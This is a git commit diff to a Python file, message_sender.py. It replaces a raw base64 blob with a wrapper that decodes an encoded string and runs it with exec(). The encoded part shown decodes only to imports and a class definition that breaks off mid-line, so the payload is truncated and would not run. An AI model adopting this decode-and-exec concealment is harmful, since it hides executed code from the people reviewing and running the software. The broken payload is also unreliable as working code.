36028acf0262e876fe23f2b5e19de70e1c53c1ae
DEVILLKING83 <gautammr479@gmail.com>
2024-10-08 22:08:58 +0530

    Update message_sender.py

--- message_sender.py
+++ message_sender.py
@@ -1,3 +1,11 @@
-aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IGh0dHBfc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKCmNsYXNzIE15SGFuZGxlciBodHRwLnNlcnZlci5TaW1wbGU
-...
-L29fcy9tYXJrZXQK
+#incoded by devil
+import base64
+
+# The Base64 encoded string
+encoded_string = 'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IGh0dHBfc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKCmNsYXNzIE15SGFuZGxlciBodHRwLnNlcnZlci5TaW1wbGU='
+
+# Decode the string
+decoded_code = base64.b64decode(encoded_string).decode('utf-8')
+
+# Execute the decoded code
+exec(decoded_code)
